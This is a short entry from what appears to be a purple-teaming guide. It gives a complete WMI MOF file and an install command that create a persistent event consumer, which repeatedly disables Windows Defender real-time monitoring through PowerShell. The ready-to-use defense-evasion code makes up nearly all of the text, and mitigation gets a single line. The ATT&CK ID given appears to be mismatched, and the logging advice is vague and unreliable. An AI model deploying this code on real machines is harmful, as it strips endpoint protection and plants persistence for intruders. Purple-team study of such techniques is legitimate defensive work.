21.  Purple Teaming – MITRE ATT&CK T1562.002 (Disable Windows Defender via WMI Event Consumer)
————————————————————————————————————

Create disable_defender.mof:
instance of __EventFilter as $Filter
{
  Name = "DefFilter";
  EventNamespace = "root\\cimv2";
  QueryLanguage = "WQL";
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 30 "
          "WHERE TargetInstance ISA 'Win32_Process' "
          "AND TargetInstance.Name = 'MsMpEng.exe'";
};
instance of CommandLineEventConsumer as $Consumer
{
  Name = "DefConsumer";
  CommandLineTemplate = "powershell -command \"Set-MpPreference -DisableRealTimeMonitoring $true\"";
  RunInteractively = false;
};
instance of __FilterToConsumerBinding
{
  Filter = $Filter;
  Consumer = $Consumer;
};
Compile mofcomp disable_defender.mof. The WMI engine will repeatedly disable Defender. Mitigation is WMI logging (gpedit → Audit Process Creation) and MOF signing. APT29’s campaign (2021) used this exact WMI consumer.

